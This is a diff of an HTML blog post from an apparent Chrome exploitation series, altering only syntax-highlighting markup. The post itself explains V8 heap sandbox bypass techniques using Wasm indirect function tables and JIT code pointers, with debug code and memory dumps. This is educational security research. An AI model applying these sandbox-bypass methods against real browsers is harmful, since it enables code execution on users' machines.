-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;js&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tbl&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; funcref&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f83&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;elem&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
+  (import &amp;quot;js&amp;quot; &amp;quot;tbl&amp;quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)
+  (func $f83 (result i32) i32.const 83)
+  (elem (i32.const 0) $f42 $f83)
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;times2&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pwn&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+  (func (export &amp;quot;times2&amp;quot;) (type $int2int) (i32.const 16))
+  (func (export &amp;quot;pwn&amp;quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;First, looking at the beginning and the end, you can see that everything is enclosed within a single &lt;code&gt;(module ...)&lt;/code&gt;structure. This is used for the purpose of declaring a Module.&lt;/p&gt;
 &lt;p&gt;Next follows &lt;code&gt;(type $int2int (func (param i32) (result i32)))&lt;/code&gt;, which declares a function signature. It creates a signature named &lt;code&gt;$int2int&lt;/code&gt; that takes a 32-bit integer as an argument and returns a 32-bit integer. This is also used later as the type for the &lt;code&gt;jstimes3&lt;/code&gt; function.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;(import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))&lt;/code&gt; is the declaration process that allows a JavaScript function, passed during instance creation, to be used inside the Wasm environment.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; importObject = {
-    &lt;span class=&#34;hljs-attr&#34;&gt;env&lt;/span&gt;: {
-        &lt;span class=&#34;hljs-attr&#34;&gt;jstimes3&lt;/span&gt;: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
+    env: {
+        jstimes3: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
     },
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;As a result, &lt;code&gt;&amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot;&lt;/code&gt; refers to the external name specified during the passing process, meaning that it will be invoked as &lt;code&gt;$jstimes3&lt;/code&gt; when called inside the Wasm environment.&lt;/p&gt;
@@ -964,13 +964,13 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Functions &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt; are declared to return 32-bit integers of 42 and 83 upon invocation, respectively, and are registered to the Table via &lt;code&gt;(elem (i32.const 0) $f42 $f83)&lt;/code&gt;. Here, &lt;code&gt;i32.const 0&lt;/code&gt; specifies that the starting index begins at 0.&lt;/p&gt;
 &lt;p&gt;The final two lines handle declaring the export functions that can be invoked from JavaScript; as you can see, the &lt;code&gt;pwn&lt;/code&gt;function calls the internal Wasm function &lt;code&gt;$jstimes3&lt;/code&gt;.&lt;/p&gt;
 &lt;h3 id=&#34;3-2-Using-JIT-to-Bypass-Sandbox&#34;&gt;&lt;a href=&#34;#3-2-Using-JIT-to-Bypass-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;3.2. Using JIT to Bypass Sandbox&#34;&gt;&lt;/a&gt;3.2. Using JIT to Bypass Sandbox&lt;/h3&gt;&lt;h4 id=&#34;3-2-1-JIT-Fundamentals&#34;&gt;&lt;a href=&#34;#3-2-1-JIT-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.2.1. JIT Fundamentals&#34;&gt;&lt;/a&gt;3.2.1. JIT Fundamentals&lt;/h4&gt;&lt;p&gt;As a second method for bypassing the V8 heap sandbox, there is an approach that leverages JIT. JIT, which stands for Just-In-Time, refers to a compilation technique that translates code into machine language at the exact moment the program executes. Since a method utilizing JIT for the CVE-2023-2033 exploit has also been publicly disclosed, I have briefly summarized it in this post.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) =&amp;gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; foo = &lt;span class=&#34;hljs-function&#34;&gt;() =&amp;gt;&lt;/span&gt;
 {
   &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2.2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3.3&lt;/span&gt;];
 }
 
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(foo);&lt;/code&gt;&lt;/pre&gt;
+foo();
+%DebugPrint(foo);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;The code above is a simple example that declares and executes a function named &lt;code&gt;foo()&lt;/code&gt;, which returns a double array. Printing out the internal structure of the function object &lt;code&gt;foo&lt;/code&gt; yields the following output:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;DebugPrint: 0x6f1001cc631: [Function]
  - map: 0x06f1001043e5 &amp;lt;Map[28](HOLEY_ELEMenTS)&amp;gt; [FastProperties]
@@ -1014,16 +1014,16 @@ DebugPrint: 0x6f100267cb9: [Code] &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt
 Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;If we can manipulate the &lt;code&gt;code&lt;/code&gt; field to point to an arbitrary address when invoking a JavaScript function, it consequently means we can hijack the Program Counter (PC).&lt;/p&gt;
 &lt;h4 id=&#34;3-2-2-Exploit-with-JIT&#34;&gt;&lt;a href=&#34;#3-2-2-Exploit-with-JIT&#34; class=&#34;headerlink&#34; title=&#34;3.2.2. Exploit with JIT&#34;&gt;&lt;/a&gt;3.2.2. Exploit with JIT&lt;/h4&gt;&lt;p&gt;Unlike Wasm JIT code, which is stored outside the V8 heap region, the JIT code for standard JavaScript functions is located inside the V8 heap. To verify this behavior, I modified the previous example as follows and executed it.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) =&amp;gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; foo = &lt;span class=&#34;hljs-function&#34;&gt;() =&amp;gt;&lt;/span&gt;
 {
   &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2.2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3.3&lt;/span&gt;];
 }
 
-%&lt;span class=&#34;hljs-title class_&#34;&gt;PrepareFunctionForOptimization&lt;/span&gt;(foo);
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;OptimizeFunctionOnNextCall&lt;/span&gt;(foo);
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(foo);&lt;/code&gt;&lt;/pre&gt;
+%PrepareFunctionForOptimization(foo);
+foo();
+%OptimizeFunctionOnNextCall(foo);
+foo();
+%DebugPrint(foo);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;To confirm the changes that occur after optimization, I explicitly triggered it using native syntax.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;DebugPrint: 0x1d04001cc681: [Function]
  - map: 0x1d04001043e5 &amp;lt;Map[28](HOLEY_ELEMenTS)&amp;gt; [FastProperties]
@@ -1372,8 +1372,8 @@ Instructions (size = 480)
 <p><img src="https://v8.dev/_img/pointer-compression/heap-layout-1.svg" srcset="/img/loading.gif" alt></p>
 <p>If you apply this within a 4GB-aligned memory space, all objects share the exact same base address. This means you can easily access any internal object using just a 32-bit offset.</p>
 <pre><code class="hljs jsx">                    |----- <span class="hljs-number">32</span> bits -----|----- <span class="hljs-number">32</span> bits -----|
-<span class="hljs-title class_">Compressed</span> <span class="hljs-attr">pointer</span>:                     |______offset_____w1|
-<span class="hljs-title class_">Compressed</span> <span class="hljs-title class_">Smi</span>:                         |____int31_value___0|</code></pre>
+Compressed pointer:                     |______offset_____w1|
+Compressed Smi:                         |____int31_value___0|</code></pre>
 <p>However, not every value in V8 memory is stored within this 4GB region. Because of this, uncompressed pointers (raw pointers) still existed to access external objects. Solving this exact issue was one of the main goals behind creating the V8 Heap Sandbox.</p>
 <h3 id="2-2-Mechanism-of-V8-Heap-Sandbox"><a href="#2-2-Mechanism-of-V8-Heap-Sandbox" class="headerlink" title="2.2. Mechanism of V8 Heap Sandbox"></a>2.2. Mechanism of V8 Heap Sandbox</h3><p>The V8 Heap Sandbox is a new security mitigation introduced in March 2024, starting with Chrome version 123. In this post, we will revisit the concept of the V8 Heap Sandbox&#x2014;which was briefly mentioned at the end of <a href="https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/"><em>Chrome Exploit Part 4: Starting with Type Confusion 101</em></a> (published before the Wipeload project)&#x2014;and analyze the methods used to bypass it from a technical perspective.</p>
 <p>In the case of the two previously mentioned vulnerabilities, if memory corruption allowed arbitrary read/write access, there were no restrictions on the accessible memory area, making successful exploitation relatively smooth. The Heap Sandbox was introduced to block this, limiting access so that even if memory corruption occurs, attackers cannot access arbitrary memory addresses.</p>
@@ -1409,22 +1409,22 @@ Instructions (size = 480)
 </li>
 </ol>
 <p>Based on these patch histories, we can infer that a field storing a raw pointer existed within <code>WasmIndirectFunctionTable</code>, a Wasm-related object. Before diving into the vulnerability itself, let&#x2019;s take a quick look at what this object actually does.</p>
-<h4 id="3-1-2-Wasm-Fundamentals"><a href="#3-1-2-Wasm-Fundamentals" class="headerlink" title="3.1.2. Wasm Fundamentals"></a>3.1.2. Wasm Fundamentals</h4><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> tbl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Table</span>({
-    <span class="hljs-attr">initial</span>: <span class="hljs-number">2</span>,
-    <span class="hljs-attr">element</span>: <span class="hljs-string">&quot;anyfunc&quot;</span>
+<h4 id="3-1-2-Wasm-Fundamentals"><a href="#3-1-2-Wasm-Fundamentals" class="headerlink" title="3.1.2. Wasm Fundamentals"></a>3.1.2. Wasm Fundamentals</h4><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> tbl = <span class="hljs-keyword">new</span> WebAssembly.Table({
+    initial: <span class="hljs-number">2</span>,
+    element: <span class="hljs-string">&quot;anyfunc&quot;</span>
 });
 <span class="hljs-keyword">const</span> importObject = {
-    <span class="hljs-attr">env</span>: {
-        <span class="hljs-attr">jstimes3</span>: <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> <span class="hljs-number">3</span> * n,
+    env: {
+        jstimes3: <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> <span class="hljs-number">3</span> * n,
     },
-    <span class="hljs-attr">js</span>: { tbl }
+    js: { tbl }
 };
-<span class="hljs-keyword">var</span> code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">96</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">2</span>, <span class="hljs-number">27</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">118</span>, <span class="hljs-number">8</span>, <span class="hljs-number">106</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">106</span>, <span class="hljs-number">115</span>, <span class="hljs-number">3</span>, <span class="hljs-number">116</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">16</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">112</span>, <span class="hljs-number">119</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">24</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">16</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>]);
-<span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(code);
-<span class="hljs-keyword">var</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(<span class="hljs-variable language_">module</span>, importObject);
-<span class="hljs-keyword">var</span> times2 = instance.<span class="hljs-property">exports</span>.<span class="hljs-property">times2</span>;
+<span class="hljs-keyword">var</span> code = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">96</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">2</span>, <span class="hljs-number">27</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">118</span>, <span class="hljs-number">8</span>, <span class="hljs-number">106</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">106</span>, <span class="hljs-number">115</span>, <span class="hljs-number">3</span>, <span class="hljs-number">116</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">16</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">112</span>, <span class="hljs-number">119</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">24</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">16</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>]);
+<span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = <span class="hljs-keyword">new</span> WebAssembly.Module(code);
+<span class="hljs-keyword">var</span> instance = <span class="hljs-keyword">new</span> WebAssembly.Instance(<span class="hljs-built_in">module</span>, importObject);
+<span class="hljs-keyword">var</span> times2 = instance.exports.times2;
 
-%<span class="hljs-title class_">DebugPrint</span>(instance);</code></pre>
+%DebugPrint(instance);</code></pre>
 <p>Wasm is mainly composed of a Module, an Instance, and a Table. A Module is the raw, uninitialized code, which turns into an Instance after going through an initialization process. An Instance can own multiple Tables, and in our example, we can see that <code>tbl</code> created inside <code>importObject</code> is passed along.</p>
 <p>Within V8, an Instance is managed as a <code>WasmInstanceObject</code>, and its key fields are as follows:</p>
 <ol>
@@ -1494,22 +1494,22 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
            1: 0
 <span class="hljs-comment"># ...</span></code></pre>
 <p>In the initial code snippet, we couldn&#x2019;t directly see the declarations for <code>$f42</code> and <code>$f83</code>. To verify them yourself, converting the wasm code&#x2014;which was originally declared as a <code>Uint8Array</code>&#x2014;into a human-readable format yields the following text:</p>
-<pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">module</span>
-  <span class="hljs-comment">;; The common type we use throughout the sample.</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)))</span>
+<pre><code class="hljs wasm">(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  <span class="hljs-comment">;; Import a function named jstimes3 from the environment and call it</span>
-  <span class="hljs-comment">;; $jstimes3 here.</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;env&quot;</span> <span class="hljs-string">&quot;jstimes3&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$jstimes3</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)))</span>
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &quot;env&quot; &quot;jstimes3&quot; (func $jstimes3 (type $int2int)))
 
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;tbl&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">table</span> <span class="hljs-number">2</span> funcref<span class="hljs-punctuation">))</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$f42</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-keyword">i32.const</span> <span class="hljs-number">42</span><span class="hljs-punctuation">)</span>  <span class="hljs-comment">;; [1] Define $f42 function</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$f83</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-keyword">i32.const</span> <span class="hljs-number">83</span><span class="hljs-punctuation">)</span>  <span class="hljs-comment">;; [2] Define $f83 function</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">elem</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">$f42</span> <span class="hljs-variable">$f83</span><span class="hljs-punctuation">)</span>
+  (import &quot;js&quot; &quot;tbl&quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)  ;; [1] Define $f42 function
+  (func $f83 (result i32) i32.const 83)  ;; [2] Define $f83 function
+  (elem (i32.const 0) $f42 $f83)
 
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;times2&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">16</span><span class="hljs-punctuation">))</span>
